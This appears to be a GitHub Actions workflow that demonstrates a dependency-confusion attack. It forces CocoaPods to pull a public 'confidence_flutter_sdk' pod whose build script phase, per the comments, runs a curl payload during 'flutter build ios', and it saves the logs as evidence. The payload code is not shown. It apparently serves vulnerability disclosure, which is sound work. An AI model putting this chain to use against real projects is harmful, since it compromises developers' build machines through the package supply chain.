name: Supply Chain RCE Proof of Concept
on: [push, workflow_dispatch]

jobs:
  poc:
    runs-on: macos-latest
    steps:
      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Execute Full RCE Chain (Public Registry Resolve)
        run: |
          # 0. NUCLEAR RESET
          rm -rf rce_test
          
          # 1. Create fresh dummy project
          flutter create rce_test
          cd rce_test
          
          # Paksa tambahkan dependency agar pubspec.yaml terupdate
          flutter pub add confidence_flutter_sdk
          
          # 2. Patch Platform Version ke 16.0
          sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
          
          # 3. NATIVE RESOLUTION (The Dependency Confusion Route)
          sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
          echo "pod 'confidence_flutter_sdk'" >> ios/Podfile
          
          cd ios
          # 4. SUPER CLEANUP PROTOCOL (Bypass CDN Latency)
          echo "=== Purging Everything including Local Trunk Cache ==="
          pod cache clean --all
          rm -rf Pods
          rm -rf Podfile.lock
          
          # Hapus local repo trunk biar Runner dipaksa fetch metadata terbaru dari server
          rm -rf ~/.cocoapods/repos/trunk
          
          # Force update dari master repo
          pod repo update trunk
          
          # Jalankan install secara verbose
          pod install --verbose 2>&1 | tee pod_install.log || true
          
          echo "=== Check Podfile.lock Status ==="
          # Cek apakah sudah narik versi 2.0.1 (Payload Script Phase)
          ls -la Podfile.lock || echo "Podfile.lock STILL MISSING"
          grep -A 1 "confidence_flutter_sdk" Podfile.lock
          
          cd ..
          # 5. Build Phase - Execution Phase (Trigger Script Phase & Payload)
          # Payload curl lu bakal jalan di sini sebelum Xcode nyadar ada error Swift
          flutter build ios --no-codesign 2>&1 | tee build.log || true
          
          echo "=== Build log tail ==="
          tail -30 build.log

      - name: Upload Logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: poc-evidence
          path: |
            rce_test/ios/pod_install.log
            rce_test/ios/Podfile.lock
            rce_test/build.log
